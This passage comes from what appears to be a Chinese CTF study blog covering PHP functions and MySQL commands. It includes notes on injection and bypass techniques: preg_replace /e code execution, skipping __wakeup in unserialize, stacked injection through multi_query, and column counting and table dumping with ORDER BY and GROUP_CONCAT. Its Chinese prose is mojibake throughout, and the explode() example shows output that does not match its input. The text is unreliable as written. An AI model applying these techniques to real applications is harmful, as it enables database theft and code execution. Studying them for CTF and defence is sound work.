class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>$a = 3; $b = Dog; $c = Horse</blockquote><p><code>eregi($str1,$str2)</code>ä¸<code>ereg($str1,$str2)</code>    # åœ¨ str2ä¸­æœç´¢ str1ä¸­çš„å­—ç¬¦ï¼Œå­˜åœ¨æ—¶è¿”å› trueï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å®Œå…¨ç›¸åŒï¼Œé™¤äº†å‰è€…å¿½ç•¥å¤§å°å†™ï¼Œåè€…ä¸å¿½ç•¥å¤§å°å†™ï¼Œå½“ç¬¬ä¸€ä¸ªå­—æ®µä¸ºç©º (NULL)æ—¶ï¼Œå°±ç»•è¿‡äº†æ­¤å‡½æ•° // è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æ˜¯ PHP4ï¼ŒPHP5æ‰æœ‰ï¼Œè¾ƒä¸ºè¿œå¤</p><p><code>trim($str1, $str2)</code>    # å½“åªå¡«ä¸€ä¸ªå‚æ•°æ—¶ï¼Œtrimå‡½æ•°è¿”å›å»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦åçš„ç»“æœï¼›å½“å¡«äº†ç¬¬äºŒä¸ªå‚æ•°åï¼Œtrimå‡½æ•°è¿”å› $str1ä¸¤ç«¯å»é™¤ $str2æŒ‡å®šçš„å­—ç¬¦åçš„ç»“æœ</p><p><code>strstr($str1,$str2)</code>ä¸<code>stristr(\$str1,\$str2)</code>    # æŸ¥æ‰¾$str2åœ¨$str1ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹ï¼Œå¹¶è¿”å›å‰©ä½™éƒ¨åˆ†ï¼Œå¦‚$str1=â€abcdeâ€ï¼Œ$str2=â€cdâ€ï¼Œåˆ™è¿”å› â€œcdeâ€ã€‚å‰è€…ä¸¥æ ¼æ¯”è¾ƒå¤§å°å†™ï¼Œå¯ç”¨æ›´æ”¹å¤§å°å†™æ£€æŸ¥ç½‘é¡µæ˜¯å¦ä½¿ç”¨strstr()è¿›è¡Œè¿‡æ»¤ï¼›åè€…å¯¹å¤§å°å†™ä¸æ•æ„Ÿ</p><p><code>substr($str,$int1,$int2)</code>    # è¿”å›$strä¸­ç¬¬$int1ä¸ªå­—ç¬¦å¼€å§‹ï¼Œçš„$int2ä¸ªå­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œå½“$int2ä¸è®¾ç½®æ—¶è¿”å›ç¬¬$int1ä¸ªå­—ç¬¦åçš„å…¨éƒ¨å­—ç¬¦</p><p><code>strcmp($str1, $str2)</code>    # æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ï¼Œè¿”å› 0ï¼Œå‰è€…å¤§äºåè€…è¿”å› 1ï¼Œåè€…å¤§äºå‰è€…è¿”å› -1ï¼Œå­—ç¬¦ä¸²çš„å¤§å°æ ¹æ®è‡ªç„¶æ’åºæ¯”è¾ƒï¼Œå¤§æ¦‚å°±è·Ÿç€æ„Ÿè§‰èµ°çš„æ„æ€ â€¦</p><p><code>str_replace($str1,$str2,$str3)</code>    # æŠŠ$str3ä¸­å­˜åœ¨çš„æ‰€æœ‰$str1æ›¿æ¢ä¸º$str2</p><p><code>stripos($str1,$str2)</code>    # æŸ¥æ‰¾ str2åœ¨ str1ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè¿”å› int</p><p><code>parse_str($str)</code>    # æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼Œå¦‚parse_str(â€œname=Bill&amp;age=60â€); åˆ™ç°åœ¨æœ‰äº†ä¸¤ä¸ªå˜é‡$name=Bill å’Œ$age=60</p><p><code>str_split($str,$len)</code>    # æŠŠå­—ç¬¦ä¸²åˆ†å‰²åˆ°æ•°ç»„ä¸­ï¼ŒæŒ‰é•¿åº¦åˆ†å‰²ï¼Œ$lené»˜è®¤ä¸º1ï¼Œçœ‹ä¸ªä¾‹å­å°±æ˜ç™½äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(str_split(<span class="string">&quot;S hangh ai&quot;</span>,<span class="number">3</span>));</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>    &emsp;[0] => S h<br>    &emsp;[1] => ang<br>    &emsp;[2] => h a<br>    &emsp;[3] => i<br>)</blockquote><p><code>explode($str1,$str2)</code>    # $str1ä½œä¸ºåˆ†éš”ç¬¦ï¼Œä»¥æ­¤å°†å­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ï¼Œçœ‹ä¸ªä¾‹å­å°±æ˜ç™½äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World, I love You&quot;</span>;</span><br><span class="line">print_r (explode(<span class="string">&quot; &quot;</span>,<span class="variable">$str</span>));<span class="comment">//ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦</span></span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>&emsp;[0] => Hello<br>&emsp;[1] => world.<br>&emsp;[2] => I<br>&emsp;[3] => love<br>&emsp;[4] => Shanghai!<br>)</blockquote><p><code>preg_replace($pattern, $replacement, $subject)</code>    # å…¶ä¸­ {$patternä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œ$replacementä¸ºæ›¿æ¢å­—ç¬¦ä¸²ï¼Œ$subject ä¸ºè¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„} ã€‚è¿™ä¸ªå‡½æ•°æ­£åˆ™è¡¨è¾¾å¼$patternä»¥â€œ/eâ€ç»“å°¾æ—¶$replacementçš„å€¼ä¼šè¢«ä½œä¸ºPHPå‡½æ•°æ‰§è¡Œï¼Œä¾‹å¦‚æ‰§è¡Œpreg_replace (â€˜/test/eâ€™ , â€œphpinfo();â€ , â€œtestâ€)ï¼Œâ€œtestâ€ä¼šè¢«æ›¿æ¢ä¸º phpinfo();å¹¶æ‰§è¡Œ</p><p><code>preg_match($pattern, $str, $matches)</code>    # å…¶ä¸­ $patternä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œ$strä¸ºè¢«æœç´¢çš„ç›®æ ‡å­—ç¬¦ä¸²ï¼Œè‹¥æä¾›äº†å‚æ•° $matchesï¼Œåˆ™ä¼šåœ¨åŒ¹é…åˆ°åè¢«è¿”å›ï¼Œä¸”é™„åŠ åœ¨å­—ç¬¦ä¸²ä¸­çš„ indexï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/(foo)(bar)(baz)/&#x27;</span>, <span class="string">&#x27;foobarbaz&#x27;</span>, <span class="variable">$matches</span>, PREG_OFFSET_CAPTURE);</span><br><span class="line">print_r(<span class="variable">$matches</span>);</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>&emsp;[0] => Array(<br>&emsp;&emsp;[0] => foobarbaz<br>&emsp;&emsp;[1] => 0<br>&emsp;)<br>&emsp;[1] => Array(<br>&emsp;&emsp;[0] => foo<br>&emsp;&emsp;[1] => 0<br>&emsp;)<br>&emsp;[2] => Array(<br>&emsp;&emsp;[0] => bar<br>&emsp;&emsp;[1] => 3)<br>&emsp;[3] => Array(<br>&emsp;&emsp;[0] => baz<br>&emsp;&emsp;[1] => 6<br>&emsp;)<br>)</blockquote><p><code>serialize()</code>ä¸<code>unserialize()</code>    # åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œäº’ä¸ºåå‡½æ•°ï¼Œåªéœ€äº†è§£åºåˆ—åŒ–å³å¯ï¼Œç®€å•æ¥è¯´å°±æ˜¯æŠŠå˜é‡è½¬ä¸º stringï¼Œä¿ç•™å…³äºåŸæœ¬æ•°æ®ç±»å‹çš„ä¿¡æ¯ï¼Œåºåˆ—åŒ–çš„å­˜åœ¨æ„ä¹‰åœ¨äºä½¿ä¸€åˆ‡å˜é‡çš„ä¼ è¾“æ— å¼‚äºå­—ç¬¦ä¸²ä¼ è¾“ï¼›ä½†éœ€è¦æ³¨æ„çš„æ˜¯privateå˜é‡åå‰ä¼šæœ‰%00åŒ…è£¹ç±»åå ä½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kyriota</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;male&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">25</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weight</span>=<span class="number">60.5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$LoveCTF</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thingsDoentLike</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$tags</span>=<span class="keyword">array</span>(<span class="string">&quot;Steam&quot;</span>,<span class="number">1990</span>,<span class="string">&quot;Aperture&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Kyriota()),<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]//åŸæœ¬æ— æ¢è¡Œç¬¦ä¸ä»»ä½•ç©ºæ ¼ï¼Œä¸ºäº†å¯è¯»æ€§è€Œæ‰‹åŠ¨æ·»åŠ <br>O:7:"Kyriota":6:{<br>&emsp;s:3:"sex";s:4:"male";<br>&emsp;s:3:"age";i:25;<br>&emsp;s:6:"weight";d:60.5;<br>&emsp;s:7:"LoveCTF";b:1;<br>&emsp;s:15:"thingsDoentLike";N;<br>&emsp;s:13:"%00Kyriota%00tags";a:3:{<br>&emsp;&emsp;i:0;s:5:"Steam";<br>&emsp;&emsp;i:1;i:1990;<br>&emsp;&emsp;i:2;s:8:"Aperture";<br>&emsp;}<br>}</blockquote><ul><li><p><code>__wakeup()</code>ä¸<code>__sleep()</code>    # åœ¨ serialize()çš„æ—¶å€™å…ˆæ‰§è¡Œ__sleep()ï¼Œå¯¹æ•°æ®é¢„å¤„ç†ï¼›åœ¨ unserialize()æ‰§è¡Œçš„æ—¶å€™å…ˆæ‰§è¡Œ__wakeup()ï¼Œå¯¹æ•°æ®å†å¤„ç†ã€‚å‡½æ•°å‘½åéå¸¸å½¢è±¡ï¼Œåºåˆ—åŒ–åå˜é‡ä¸å¯¹è±¡ä¸å†è¢«è§£æï¼Œç§°å…¶ä¸ºsleepä¸wakeupéå¸¸åˆé€‚</p></li><li><p>__wakeup()ç»•è¿‡ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºçš„å¯¹è±¡å±æ€§ä¸ªæ•°å¤§äºçœŸæ˜¯ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡ __wakeup()æ‰§è¡Œï¼Œä¾‹å¦‚ä¸‹é¢æ˜¯ä¸€æ­£å¸¸åºåˆ—åŒ–åçš„æ–‡æœ¬ï¼Œè€Œå½“3è¢«ç¯¡æ”¹ä¸ºä»»ä½•å¤§äº3çš„æ•°åï¼Œååºåˆ—åŒ–æ—¶å°†ä¸æ‰§è¡Œ__wakeup()ï¼š</p><center><code>O:7:â€Studentâ€:3:&#123;s:9:â€full_nameâ€;s:8:â€zhangsanâ€;s:5:â€scoreâ€;i:150;s:6:â€gradesâ€;a:0:&#123;&#125;&#125;</code></center></li><li><p><code>__construct()</code>ä¸<code>__destruct()</code>    # åœ¨åˆ›å»ºå¯¹è±¡æ—¶constructï¼Œåœ¨å¯¹è±¡é”€æ¯æ—¶destruct</p></li></ul><p>ä¸€ä¸ªç¨‹åºå³å¯è§£é‡Šåºåˆ—åŒ–ä»¥åŠä¸Šè¿°ç›¸å…³å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__construct~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__destrcut~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__sleep~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=serialize(<span class="keyword">new</span> User(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;psswd&#x27;</span>));</span><br><span class="line"><span class="variable">$s_edited</span>=<span class="string">&#x27;O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;psswd&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">unserialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;â†‘â†‘â†‘unserialized with wakeup and destruct&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$s_edited</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;â†‘â†‘â†‘unserialized, only destruct whithout wakeup above this one&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>__construct~<br>__sleep~<br>__destrcut~<br>O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"psswd";}<br>__wakeup~<br>__destrcut~<br>â†‘â†‘â†‘unserialized with wakeup and destruct<br>__destrcut~<br>bool(false)<br>â†‘â†‘â†‘unserialized, only destruct whithout wakeup above this one<br><br>PHP Notice:  unserialize(): Unexpected end of serialized data on line 27<br>PHP Notice:  unserialize(): Error at offset 68 of 69 bytes on line 27</blockquote><code>mysql</code>ä¸<code>mysqli</code>    # mysqlè¿æ¥ï¼šæ¯å½“ç¬¬äºŒæ¬¡ä½¿ç”¨çš„æ—¶å€™ï¼Œéƒ½ä¼šé‡æ–°æ‰“å¼€ä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼›mysqliè¿æ¥ï¼šä¸€ç›´éƒ½åªä½¿ç”¨åŒä¸€ä¸ªè¿›ç¨‹<p><code>mysql_query($query)</code>    # æŸ¥è¯¢å•æ¡è¯­å¥ï¼Œä¸éœ€è¦æŸ¥è¯¢è¯­å¥ä»¥åˆ†å·ç»“æŸ</p><p><code>multi_query($query)</code>    # æŸ¥è¯¢å¤šæ¡è¯­å¥ï¼Œè¯­å¥é—´ä»¥åˆ†å·åˆ†éš”ï¼Œç»“å°¾ä¸éœ€è¦åˆ†å·ï¼Œå½“æ·»åŠ åˆ†å·å‘ç°æ˜¯ä»¥<code>multi_query()</code>æŸ¥è¯¢çš„æ—¶å€™ï¼Œå¯ä»¥è¿›è¡Œå †å æ³¨å…¥ï¼Œè¿½åŠ ä»»ä½•mysqlæŸ¥è¯¢è¯­å¥</p><p><code>mysql_fetch_xxx</code>    # è¿™ç§ç±»å‹çš„å‡½æ•°éƒ½æ˜¯ä»ç»“æœé›†ä¸­å–å‡ºä¸€è¡Œ</p><table><thead><tr><th>func</th><th>return</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_array.asp">mysql_fetch_array()</a></td><td>ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_assoc.asp">mysql_fetch_assoc()</a></td><td>ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_field.asp">mysql_fetch_field()</a></td><td>ä»ç»“æœé›†ä¸­å–å¾—åˆ—ä¿¡æ¯å¹¶ä½œä¸ºå¯¹è±¡è¿”å›</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_lengths.asp">mysql_fetch_lengths()</a></td><td>å–å¾—ç»“æœé›†ä¸­æ¯ä¸ªå­—æ®µçš„å†…å®¹çš„é•¿åº¦</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_object.asp">mysql_fetch_object()</a></td><td>ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå¯¹è±¡</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_row.asp">mysql_fetch_row()</a></td><td>ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºæ•°å­—æ•°ç»„</td></tr></tbody></table><hr><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a><big><center>SQL</center></big></h1><h2 id="MySQLåŸºç¡€å‘½ä»¤"><a href="#MySQLåŸºç¡€å‘½ä»¤" class="headerlink" title="MySQLåŸºç¡€å‘½ä»¤"></a><big>MySQLåŸºç¡€å‘½ä»¤</big></h2><ul><li><p>é€šè¿‡å‘½ä»¤è¡Œè¾“å…¥ mysql -u root -pï¼Œç„¶åè¾“å…¥å¯†ç å³å¯ç™»å½•</p><ul><li>è‹¥æŠ¥é”™ï¼Œå¯èƒ½æ˜¯ mysql æœåŠ¡æœªå¯åŠ¨ï¼Œä¹Ÿå¯èƒ½æ˜¯éœ€è¦ç®¡ç†å‘˜æƒé™çš„ cmd</li></ul></li><li><p>SHOW DATABASES; #æŸ¥çœ‹å½“å‰æ•°æ®åº“</p></li><li><p>SHOW TABLES; #æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰æ•°æ®è¡¨åç§°</p></li><li><p>DESCRIBE table; #æŸ¥çœ‹æ•°æ®è¡¨ç»“æ„ï¼Œå¦‚å‚æ•°ååŠæ•°æ®ç±»å‹</p><ul><li>SHOW COLUMNS FROM table1,table2â€¦; #å’Œä¸Šé¢çš„DESCRIBEä¸€æ ·ï¼Œåªæ˜¯è¿™å¯ä»¥åŒæ—¶é€‰æ‹©å¤šä¸ªè¡¨</li></ul></li><li><p>USE database; #è¿›å…¥æŸä¸€æ•°æ®åº“ä¸‹è¿›è¡Œæ“ä½œ</p></li><li><p>CREATE DATABASE database; #æ–°å»ºæ•°æ®åº“</p></li><li><p>CREATE TABLE table(row1 type1,row2 type2â€¦); #åœ¨è¿›å…¥æŸä¸€æ•°æ®åº“çš„å‰æä¸‹æ–°å»ºæ•°æ®è¡¨</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Person (Name varchar(25),Address varchar(80),Age int(11)) </span><br></pre></td></tr></table></figure></li><li><p>INSERT INTO table VALUES(value1, value2, â€¦); #å‘æ•°æ®è¡¨åŠ å…¥æ•°æ®</p></li><li><p>DELETE FROM table WHERE condition; #åˆ é™¤ç¬¦åˆconditionçš„æ•°æ®</p></li><li><p>ALTER TABLE table DROP column; #åˆ é™¤åˆ—</p></li><li><p>UPDATE table SET col.1=value.1 WHERE col.2=value.2; #ä¿®æ”¹æ•°æ®ï¼Œcol.1=value.1ä¸ºèµ‹å€¼è¯­å¥ï¼Œcol.2=value.2ä¸ºæŸ¥æ‰¾é¡¹</p></li><li><p>SELECTï¼šç”¨äºæŸ¥è¯¢æ•°æ®ï¼Œè™½ç›´è¯‘ä¸ºâ€˜é€‰æ‹©â€™ï¼Œä½†æˆ‘è®¤ä¸ºå…¶ä¸var_dumpç±»ä¼¼</p><ul><li><p><a href="dev.mysql.com/doc/refman/8.0/en/handler.html">HANDLER</a>ï¼šMySQLçš„ä¸“ç”¨æŸ¥è¯¢è¯­å¥ï¼Œæä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLER users OPEN;</span><br><span class="line">HANDLER user READ NEXT;</span><br><span class="line">HANDLER user CLOSE;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>show warnings; #æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯.</p></li><li><p>æ³¨é‡Šç¬¦ï¼šâ€œ#â€ä¸  â€œâ€“ â€(ä¸¤ä¸ªå‡å·åé¢å¸¦ä¸€ä¸ªç©ºæ ¼)ï¼Œæ³¨æ„GETæ–¹æ³•ä¼ å‚éœ€è¦å…ˆurlç¼–ç ï¼›ä»¥åŠåŒºåŸŸæ³¨é‡Šç¬¦/*æ³¨é‡Šå†…å®¹*/</p></li></ul><p>æ³¨æ„ï¼šå½“æ•°å­—å‹å­—ç¬¦æˆ–MySQLå…³é”®å­—ä½œä¸ºå­—æ®µã€è¡¨ã€åº“åæŸ¥è¯¢æ—¶ï¼Œåº”è¯¥ç”¨åå•å¼•å·æ‹¬èµ·æ¥ï¼Œå¦‚ SELECT * FROM &#96;2333&#96;Â WHERE &#96;from&#96;=&#96;8080&#96;;å…¶ä¸­çš„2333ä½œä¸ºè¡¨åï¼Œfromä½œä¸ºå­—æ®µåï¼Œ8080ä½œä¸ºå­—æ®µå†…å®¹Â </p><h2 id="MySQL-DICT"><a href="#MySQL-DICT" class="headerlink" title="MySQL DICT"></a><big>MySQL DICT</big></h2><ul><li><p><code>UNION</code>ï¼šç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECTè¯­å¥çš„ç»“æœé›†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">select uname,passwd from users</span><br><span class="line">union</span><br><span class="line">select &#39;Union&#39;,233;</span><br><span class="line">        #+----------+-------------+</span><br><span class="line">        #| uname    | passwd      |</span><br><span class="line">        #+----------+-------------+</span><br><span class="line">        #| Kyriota  | kyriotayyds |</span><br><span class="line">        #| 0test    | 0test       |</span><br><span class="line">        #| 233test  | 233test     |</span><br><span class="line">        #| admin    | adpasswd    |</span><br><span class="line">        #| Dr.Who   | Doctor      |</span><br><span class="line">        #| Union    | 233         |</span><br><span class="line">        #+----------+-------------+</span><br></pre></td></tr></table></figure></li><li><p><code>ORDER BY col</code>ï¼šä»¥æŸä¸€åˆ—æ¥å‡åºæ’åˆ—ï¼Œéœ€è¦é™åºæ’åˆ—æ—¶åŠ ä¸ŠDESCå³å¯ï¼Œé€šå¸¸é€šè¿‡é™„åŠ æ­¤å‡½æ•°éªŒè¯æ•°æ®è¡¨æœ‰å¤šå°‘åˆ—ï¼Œå› ä¸ºç”¨intè¡¨ç¤ºæ ¹æ®ç¬¬å‡ ä¸ªcolumnæ’åºæ—¶ï¼Œè¶…è¿‡å®é™…å­˜åœ¨çš„åˆ—æ•°ä¼šæŠ¥é”™</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 2;#æ­¤å¤„çš„2å³ä¸ºpasswdåˆ—</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| uname   | passwd      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| 0test   | 0test       |</span><br><span class="line">        #| 233test | 233test     |</span><br><span class="line">        #| admin   | adpasswd    |</span><br><span class="line">        #| Dr.Who  | Doctor      |</span><br><span class="line">        #| Kyriota | kyriotayyds |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">mysql&gt; select * from users order by 3;</span><br><span class="line">        #ERROR 1054 (42S22): Unknown column &#39;3&#39; in &#39;order clause&#39;</span><br></pre></td></tr></table></figure></li><li><p><code>CONCAT(col1,col2,col3...)</code>ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</p></li><li><p><code>CONCAT_WS(sep_str,col1,col,col3...)</code>ï¼šå¯ä»¥æŒ‡å®šåˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸²å‡½æ•°</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#39;-&#39;,uname,passwd) from users;</span><br><span class="line">        #+-----------------------------+</span><br><span class="line">        #| concat_ws(&#39;-&#39;,uname,passwd) |</span><br><span class="line">        #+-----------------------------+</span><br><span class="line">        #| Kyriota-kyriotayyds         |</span><br><span class="line">        #| 0test-0test                 |</span><br><span class="line">        #| 233test-233test             |</span><br><span class="line">        #| admin-adpasswd              |</span><br><span class="line">        #| Dr.Who-Doctor               |</span><br><span class="line">        #+-----------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>GROUP_CONCAT(col SEPARATOR 'sep') FROM table GROUP BY col</code>ï¼šæŒ‡å®šåˆ†éš”ç¬¦ä¸åˆ†ç±»æ–¹å¼ï¼Œå½“ä¸å¡«å†™åˆ†ç±»æ–¹å¼åˆ™å…¨éƒ¨åˆ†ä¸ºä¸€ç±»ï¼Œè¿™å¯ä»¥æ–¹ä¾¿çˆ†è¡¨</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| uname   | passwd      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| Kyriota | kyriotayyds |</span><br><span class="line">        #| 0test   | 0test       |</span><br><span class="line">        #| 233test | 233test     |</span><br><span 